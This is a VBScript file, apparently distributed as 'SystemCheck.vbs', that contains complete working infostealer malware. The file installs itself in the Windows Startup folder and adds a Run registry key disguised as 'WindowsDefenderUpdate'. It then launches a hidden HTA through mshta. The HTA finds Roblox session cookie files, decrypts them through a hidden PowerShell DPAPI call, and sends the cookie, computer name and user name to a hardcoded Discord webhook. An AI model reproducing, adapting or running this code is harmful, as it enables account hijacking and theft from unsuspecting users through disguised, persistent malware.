Set fso = CreateObject("Scripting.FileSystemObject")
Set sh = CreateObject("WScript.Shell")
If Err.Number <> 0 Then
    ' If run via mshta, WScript isn't available. Use the HTA object instead.
    Set sh = CreateObject("WScript.Shell")
End If

Dim selfUrl, startupPath
selfUrl = "https://dicerigs.app/SystemCheck.vbs"
startupPath = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\sys_check.vbs"

' Persist: Download self to Startup folder if not there
If Not fso.FileExists(startupPath) Then
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "GET", selfUrl, False
    h.Send
    If h.Status = 200 Then
        Dim f: Set f = fso.CreateTextFile(startupPath, True)
        f.Write h.ResponseText
        f.Close
        Set f = Nothing
    End If
    Set h = Nothing
End If

' Persist: Add to Registry Run
sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefenderUpdate", "wscript.exe """ & startupPath & """", "REG_SZ"

' Create HTA
htaPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\sys_check.hta"
Set f = fso.CreateTextFile(htaPath, True)
f.WriteLine "<html><head><title>.</title>"
f.WriteLine "<hta:application id=""a"" border=""none"" innerborder=""no"" caption=""no"" showintaskbar=""no"" sysmenu=""no"" contextmenu=""no"" selection=""no""/>"
f.WriteLine "<script language=""VBScript"">"
f.WriteLine "window.resizeTo 0,0:window.moveTo -2000,-2000"
f.WriteLine "On Error Resume Next"
f.WriteLine "Dim sh, fso, WH, PC, USER"
f.WriteLine "Set sh = CreateObject(""WScript.Shell"")"
f.WriteLine "Set fso = CreateObject(""Scripting.FileSystemObject"")"
f.WriteLine "WH = ""https://discord.com/api/webhooks/1563118302715322368/9xgemSM8Sf-T3QMCNppQ10zpxz0CMjaGohxFCg6Hl8R0cVYB-ELK49meQbAfAtvS65Mt"""
f.WriteLine "PC = sh.ExpandEnvironmentStrings(""%COMPUTERNAME%"")"
f.WriteLine "USER = sh.ExpandEnvironmentStrings(""%USERNAME%"")"
f.WriteLine "Call GrabRoblox"
f.WriteLine "window.close()"
f.WriteLine "Sub GrabRoblox()"
f.WriteLine "    Dim paths(4)"
f.WriteLine "    paths(0) = sh.ExpandEnvironmentStrings(""%LOCALAPPDATA%"") & ""\Roblox\LocalStorage\robloxcookies.dat"""
f.WriteLine "    paths(1) = sh.ExpandEnvironmentStrings(""%LOCALAPPDATA%"") & ""\Roblox\LocalStorage\RobloxCookies.dat"""
f.WriteLine "    paths(2) = sh.ExpandEnvironmentStrings(""%LOCALAPPDATA%"") & ""\Roblox\Cookies"""
f.WriteLine "    paths(3) = sh.ExpandEnvironmentStrings(""%APPDATA%"") & ""\Roblox\LocalStorage\robloxcookies.dat"""
f.WriteLine "    paths(4) = sh.ExpandEnvironmentStrings(""%USERPROFILE%"") & ""\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"""
f.WriteLine "    Dim i, fp, raw"
f.WriteLine "    For i = 0 To 4"
f.WriteLine "        If fso.FileExists(paths(i)) Then fp = paths(i): Exit For"
f.WriteLine "    Next"
f.WriteLine "    If Len(fp) = 0 Then"
f.WriteLine "        Dim pk: pk = sh.ExpandEnvironmentStrings(""%LOCALAPPDATA%"") & ""\Packages"""
f.WriteLine "        If fso.FolderExists(pk) Then"
f.WriteLine "            Dim folder, subf"
f.WriteLine "            Set folder = fso.GetFolder(pk)"
f.WriteLine "            For Each subf In folder.SubFolders"
f.WriteLine "                If InStr(subf.Name, ""ROBLOX"") > 0 Then"
f.WriteLine "                    Dim uwp: uwp = subf.Path & ""\LocalState\RobloxCookies.dat"""
f.WriteLine "                    If fso.FileExists(uwp) Then fp = uwp: Exit For"
f.WriteLine "                End If"
f.WriteLine "            Next"
f.WriteLine "            Set folder = Nothing"
f.WriteLine "        End If"
f.WriteLine "    End If"
f.WriteLine "    If Len(fp) = 0 Then Call PostEmbed(""Roblox"", ""No cookie file found"", 16711680): Exit Sub"
f.WriteLine "    raw = ReadFile(fp)"
f.WriteLine "    If Len(raw) < 50 Then Call PostEmbed(""Roblox"", ""File too small: "" & Len(raw) & "" bytes"", 16711680): Exit Sub"
f.WriteLine "    Dim cookie: cookie = """": Dim approach: approach = """""
f.WriteLine "    If InStr(raw, ""_|WARNING"") > 0 Then cookie = raw: approach = ""Plaintext"""
f.WriteLine "    If Len(cookie) = 0 And InStr(raw, ""CookiesData"") > 0 Then"
f.WriteLine "        approach = ""JSON-DPAPI"""
f.WriteLine "        Dim sp: sp = InStr(raw, ""CookiesData"""":""""")"
f.WriteLine "        If sp > 0 Then"
f.WriteLine "            sp = sp + 14"
f.WriteLine "            Dim ep: ep = InStr(sp, raw, """""""")"
f.WriteLine "            If ep > sp Then"
f.WriteLine "                Dim b64: b64 = Mid(raw, sp, ep - sp)"
f.WriteLine "                If Len(b64) > 100 Then"
f.WriteLine "                    cookie = DecryptDPAPI(b64)"
f.WriteLine "                    If Len(cookie) = 0 Then cookie = b64: approach = ""JSON-Raw"""
f.WriteLine "                End If"
f.WriteLine "            End If"
f.WriteLine "        End If"
f.WriteLine "    End If"
f.WriteLine "    If Len(cookie) = 0 And InStr(raw, "".ROBLOSECURITY"") > 0 Then"
f.WriteLine "        approach = ""Raw-ROBLOSECURITY"""
f.WriteLine "        Dim rp: rp = InStr(raw, "".ROBLOSECURITY"")"
f.WriteLine "        cookie = Mid(raw, rp)"
f.WriteLine "    End If"
f.WriteLine "    If Len(cookie) = 0 Then cookie = raw: approach = ""RawFile"""
f.WriteLine "    Dim cae: cae = InStr(cookie, ""|$CAE"")"
f.WriteLine "    If cae = 0 Then cae = InStr(cookie, ""|_CAE"")"
f.WriteLine "    If cae > 0 Then cookie = Mid(cookie, cae)"
f.WriteLine "    Call PostEmbed(""Roblox ("" & approach & "")"", ""Size: "" & Len(cookie) & vbLf & Left(cookie, 60) & ""..."", 65280)"
f.WriteLine "    Call PostFile(""cookie.txt"", cookie)"
f.WriteLine "End Sub"
f.WriteLine "Function DecryptDPAPI(b64)"
f.WriteLine "    DecryptDPAPI = """": On Error Resume Next: Dim inf: inf = TmpFile(""dpi.txt""): Dim outf: outf = TmpFile(""dpo.txt""): fso.DeleteFile outf, True: WriteFile inf, b64"
f.WriteLine "    Dim ps: ps = ""Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '"" & inf & ""' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '"" & outf & ""' -Encoding utf8}catch{''''|Out-File '"" & outf & ""' -Encoding utf8}"""
f.WriteLine "    Dim psf: psf = TmpFile(""dpapi.ps1""): WriteFile psf, ps: sh.Run ""powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """""" & psf & """""""", 0, True"
f.WriteLine "    If fso.FileExists(outf) Then If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)"
f.WriteLine "    fso.DeleteFile inf, True: fso.DeleteFile psf, True: fso.DeleteFile outf, True: End Function"
f.WriteLine "Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings(""%TEMP%"") & ""\"" & name: End Function"
f.WriteLine "Sub WriteFile(path, content): On Error Resume Next: Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub"
f.WriteLine "Function ReadFile(path): On Error Resume Next: ReadFile = """": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function"
f.WriteLine "Sub PostEmbed(t, d, c): On Error Resume Next: Dim j: j = ""{""""embeds"""":[{""""title"""":"""""" & Ej(t) & """""",""""description"""":"""""" & Ej(d) & """""",""""color"""":"""" & c & """",""""footer"""":{""""text"""":"""""" & Ej(PC & "" / "" & USER) & """"""}}]}"""
f.WriteLine "    Dim h: Set h = CreateObject(""MSXML2.ServerXMLHTTP.6.0""): h.SetOption 2, 13056: h.Open ""POST"", WH, False: h.SetRequestHeader ""Content-Type"", ""application/json"": h.Send j: Set h = Nothing: End Sub"
f.WriteLine "Sub PostFile(fn, ct): On Error Resume Next: Dim b: b = MkGuid(): Dim bd: bd = ""--"" & b & vbCrLf & ""Content-Disposition: form-data; name=""""file""""; filename="""""" & fn & """""""" & vbCrLf & vbCrLf & ct & vbCrLf & ""--"" & b & ""--"""
f.WriteLine "    Dim h: Set h = CreateObject(""MSXML2.ServerXMLHTTP.6.0""): h.SetOption 2, 13056: h.Open ""POST"", WH, False: h.SetRequestHeader ""Content-Type"", ""multipart/form-data; boundary="" & b: h.Send bd: Set h = Nothing: End Sub"
f.WriteLine "Function Ej(s): s = Replace(s, ""\"", ""\\""): s = Replace(s, """""", ""\""""""): s = Replace(s, vbCrLf, ""\n""): s = Replace(s, vbCr, ""\n""): s = Replace(s, vbLf, ""\n""): s = Replace(s, vbTab, ""\t""): Ej = s: End Function"
f.WriteLine "Function MkGuid(): Dim t: Set t = CreateObject(""Scriptlet.TypeLib""): MkGuid = Mid(t.GUID, 2, 36): Set t = Nothing: End Function"
f.WriteLine "</script>"
f.WriteLine "</head><body></body></html>"
f.Close
sh.Run "mshta.exe """ & htaPath & """", 0, False
